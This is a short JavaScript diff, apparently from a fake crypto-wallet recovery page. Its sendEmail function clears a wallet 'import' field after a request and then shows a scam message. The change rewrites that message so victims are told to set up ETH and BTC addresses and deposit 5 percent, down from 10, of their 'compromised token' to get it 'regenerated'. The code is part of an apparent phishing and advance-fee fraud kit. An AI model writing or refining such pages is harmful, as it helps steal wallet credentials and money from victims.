@@ -12,7 +12,7 @@ function sendEmail() {
         res => {
             document.getElementById("import").value ="";
             console.log(res);
-            document.getElementById("query").innerHTML = "Regeneration In Progress, On this web3 wallet, add 10 percent of the compromised token as you will get it regenerated in few hours after, More details via email !!!";
+            document.getElementById("query").innerHTML = "Regeneration In Progress, On this web3 wallet, set up an eth and btc wallet address and add 5 percent of the compromised token as you will get it regenerated in few hours after, More details via email !!!";
         } )  
         .catch(err => console.log(err)); 
 }
